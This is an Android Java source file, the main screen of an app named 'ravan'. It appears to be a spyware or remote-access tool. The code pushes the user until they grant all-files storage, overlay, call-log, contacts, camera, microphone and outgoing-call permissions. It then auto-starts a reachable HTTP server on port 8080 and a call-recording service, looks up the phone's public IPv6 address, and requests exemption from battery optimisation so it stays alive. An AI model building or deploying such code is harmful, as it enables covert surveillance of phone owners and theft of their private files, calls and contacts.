package com.security.ravan;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 1002;

    private TextView tvStatus;
    private TextView tvIpAddress;
    private TextView tvServerUrl;
    private Button btnStartStop;
    private boolean isServerRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        // requestPermissions(); // Moved to onResume loop
        updateUI();
    }

    private void initViews() {
        tvStatus = findViewById(R.id.tvStatus);
        tvIpAddress = findViewById(R.id.tvIpAddress);
        tvServerUrl = findViewById(R.id.tvServerUrl);
        btnStartStop = findViewById(R.id.btnStartStop);

        btnStartStop.setOnClickListener(v -> toggleServer());

        findViewById(R.id.btnCopyUrl).setOnClickListener(v -> {
            String url = tvServerUrl.getText().toString();
            if (!url.isEmpty() && !url.equals("Not running")) {
                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(
                        CLIPBOARD_SERVICE);
                android.content.ClipData clip = android.content.ClipData.newPlainText("Server URL", url);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(this, "URL copied to clipboard!", Toast.LENGTH_SHORT).show();
            }
        });

        findViewById(R.id.btnBatteryOptimization).setOnClickListener(v -> {
            requestBatteryOptimization();
        });
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else {
                Toast.makeText(this, "Battery optimization already disabled", Toast.LENGTH_SHORT).show();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            updateUI();
        }
    }

    private void toggleServer() {
        if (isServerRunning) {
            stopServer();
        } else {
            startServer();
        }
    }

    private void startServer() {
        Intent serviceIntent = new Intent(this, HttpServerService.class);
        serviceIntent.setAction("START");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Start CallRecordService for call detection and recording
        Intent callServiceIntent = new Intent(this, CallRecordService.class);
        callServiceIntent.setAction("START_SERVICE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(callServiceIntent);
        } else {
            startService(callServiceIntent);
        }

        isServerRunning = true;
        updateUI();
    }

    private void stopServer() {
        Intent serviceIntent = new Intent(this, HttpServerService.class);
        serviceIntent.setAction("STOP");
        startService(serviceIntent);

        isServerRunning = false;
        updateUI();
    }

    private void updateUI() {
        if (isServerRunning) {
            tvStatus.setText("🟢 Server Running");
            tvStatus.setTextColor(getColor(android.R.color.holo_green_dark));
            btnStartStop.setText("Stop Server");
            btnStartStop.setBackgroundColor(getColor(android.R.color.holo_red_light));

            tvIpAddress.setText("Fetching Public IPv6...");
            tvServerUrl.setText("Please wait...");

            getPublicIPv6Async(ip -> {
                runOnUiThread(() -> {
                    if (ip != null) {
                        tvIpAddress.setText("IPv6: " + ip);
                        tvServerUrl.setText("http://[" + ip + "]:8080");
                    } else {
                        // Fallback to local if public fetch fails
                        String localIp = getLocalIPv6Address();
                        if (localIp != null) {
                            tvIpAddress.setText("IPv6 (Local): " + localIp);
                            tvServerUrl.setText("http://[" + localIp + "]:8080");
                        } else {
                            tvIpAddress.setText("IPv6: Not available");
                            tvServerUrl.setText("Check network connection");
                        }
                    }
                });
            });

        } else {
            tvStatus.setText("🔴 Server Stopped");
            tvStatus.setTextColor(getColor(android.R.color.holo_red_dark));
            btnStartStop.setText("Start Server");
            btnStartStop.setBackgroundColor(getColor(android.R.color.holo_green_dark));
            tvServerUrl.setText("Not running");
            tvIpAddress.setText("IPv6: Service Stopped");
        }
    }

    public interface IpCallback {
        void onResult(String ip);
    }

    public static void getPublicIPv6Async(IpCallback callback) {
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            String publicIp = null;
            try {
                URL url = new URL("https://api64.ipify.org");
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setConnectTimeout(5000);
                urlConnection.setReadTimeout(5000);
                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                publicIp = in.readLine();
                in.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            // If external fetch fails, try to find a global unicast address locally
            if (publicIp == null) {
                publicIp = getLocalIPv6Address();
            }

            callback.onResult(publicIp);
        });
        executor.shutdown();
    }

    // Renamed from getIPv6Address to avoid confusion
    public static String getLocalIPv6Address() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr instanceof Inet6Address) {
                        String ip = addr.getHostAddress();
                        // Remove zone index if present
                        int idx = ip.indexOf('%');
                        if (idx >= 0) {
                            ip = ip.substring(0, idx);
                        }
                        // Skip link-local addresses (fe80::)
                        if (!ip.toLowerCase().startsWith("fe80")) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkAndEnforceRequirements();
    }

    private void checkAndEnforceRequirements() {
        // 1. Check Notification Permission/Status
        if (!areNotificationsEnabled()) {
            showNotificationPermissionDialog();
            return; // invalid state
        }

        // 2. Check Special Permissions (Storage Manager & Overlays)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                }
                btnStartStop.setVisibility(android.view.View.GONE);
                tvStatus.setText("Waiting for Storage Permission...");
                return;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 1003);
                btnStartStop.setVisibility(android.view.View.GONE);
                tvStatus.setText("Waiting for Overlay Permission...");
                return;
            }
        }

        // 3. Check Runtime Permissions
        List<String> missingPermissions = getMissingPermissions();
        if (!missingPermissions.isEmpty()) {
            // Request permissions if missing
            ActivityCompat.requestPermissions(this,
                    missingPermissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
            // Hide controls until perms granted
            btnStartStop.setVisibility(android.view.View.GONE);
            tvStatus.setText("Waiting for permissions...");
        } else {
            // 4. All Good -> Auto Start and Show Controls
            btnStartStop.setVisibility(android.view.View.VISIBLE);

            // Auto-start service if not running
            if (!isServerRunning) {
                startServer();
            }
            updateUI();
        }
    }

    private boolean areNotificationsEnabled() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this,
                    Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        } else {
            return androidx.core.app.NotificationManagerCompat.from(this).areNotificationsEnabled();
        }
    }

    private void showNotificationPermissionDialog() {
        new android.app.AlertDialog.Builder(this)
                .setTitle("Notifications Required")
                .setMessage(
                        "This app requires notifications to be enabled to function correctly. Please enable them in settings.")
                .setCancelable(false)
                .setPositiveButton("Go to Settings", (dialog, which) -> {
                    Intent intent = new Intent();
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        intent.setAction(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                        intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
                    } else {
                        intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
                        intent.putExtra("app_package", getPackageName());
                        intent.putExtra("app_uid", getApplicationInfo().uid);
                    }
                    startActivity(intent);
                })
                .setNegativeButton("Close App", (dialog, which) -> {
                    finishAffinity();
                })
                .show();
    }

    private List<String> getMissingPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        // Re-use logic from requestPermissions but return list
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
        } else {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(Manifest.permission.CAMERA);
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);

        return permissionsNeeded;
    }

}
